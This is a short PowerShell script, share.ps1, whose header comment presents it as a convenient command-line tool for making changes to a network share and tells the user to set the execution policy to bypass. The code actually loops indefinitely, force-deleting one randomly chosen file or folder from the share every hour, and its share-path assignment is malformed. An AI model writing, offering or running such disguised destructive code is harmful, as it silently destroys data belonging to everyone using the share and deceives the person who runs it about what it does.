##### share.ps1 #####
<#
By: Cpl Cook, Remington
This script allows for a user to make changes to a share easily via cli.
In order to use this script you must have the following prerequisites.
1) Be on the same network that the share is being hosted on.
2) Know the network share location
3) Have access to the share

If the powershell execution policy is not set to bypass there are 2 options
1) Using an administrator account run the command:
        Set-ExecutionPolicy bypass
        When prompted press 'A' Then press enter.

#>

$Share =  #Replace the path with the path to your share"\\10.10.0.3\Share"
$Sleep = 3600
$Path = Test-Path $Share
            #### Delete Files Over Time  ####
            While($Path -eq "True")
            {
                $files = Get-ChildItem -Path $Share -Recurse
                $Sample = $files | Get-Random -Count 1 | Remove-Item -Force -Recurse
                $Path = Test-Path $Share
                Start-Sleep $Sleep
            }
